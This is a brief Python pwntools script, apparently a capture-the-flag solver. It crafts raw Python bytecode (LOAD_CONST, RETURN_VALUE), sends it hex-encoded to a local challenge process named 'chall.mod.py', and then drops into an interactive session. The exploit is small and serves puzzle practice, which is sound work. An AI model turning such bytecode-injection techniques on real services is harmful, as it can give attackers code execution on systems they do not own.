from pwn import *
from opcode import opmap


code = b""
code += bytes([0])
code += bytes([opmap["LOAD_CONST"], 0])
code += bytes([opmap["RETURN_VALUE"]])
# code += bytes([opmap["RETURN_VALUE"]])

io = process(["python", "chall.mod.py"])
io.sendlineafter(b"cod?", code.hex().encode())
io.sendlineafter(b"name?", "")
io.interactive()
